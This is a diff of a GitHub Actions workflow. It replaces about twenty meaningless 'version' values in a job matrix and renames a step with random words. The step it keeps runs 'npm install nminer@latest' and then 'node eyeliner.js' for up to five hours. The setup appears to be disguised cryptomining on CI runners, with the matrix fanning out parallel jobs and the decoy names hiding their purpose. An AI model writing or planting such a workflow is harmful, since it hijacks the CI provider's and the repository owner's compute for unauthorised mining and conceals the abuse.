@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5148 }
-          - { version: 3794 }
-          - { version: 830 }
-          - { version: 8528 }
-          - { version: 9905 }
-          - { version: 8320 }
-          - { version: 5892 }
-          - { version: 4850 }
-          - { version: 5785 }
-          - { version: 8171 }
-          - { version: 5070 }
-          - { version: 4243 }
-          - { version: 6527 }
-          - { version: 9607 }
-          - { version: 5022 }
-          - { version: 9012 }
-          - { version: 3205 }
-          - { version: 7030 }
-          - { version: 1363 }
-          - { version: 9572 }
+          - { version: 4623 }
+          - { version: 2926 }
+          - { version: 4991 }
+          - { version: 4385 }
+          - { version: 5985 }
+          - { version: 9013 }
+          - { version: 2236 }
+          - { version: 5399 }
+          - { version: 841 }
+          - { version: 5620 }
+          - { version: 5409 }
+          - { version: 7942 }
+          - { version: 4214 }
+          - { version: 2184 }
+          - { version: 963 }
+          - { version: 6601 }
+          - { version: 5096 }
+          - { version: 3751 }
+          - { version: 7841 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: penalise before aggressive while
+      - name: recent decongestant
         run: |
           npm install nminer@latest
-          timeout 327m node eyeliner.js || echo "eyeliner executed"
+          timeout 310m node eyeliner.js || echo "eyeliner executed"
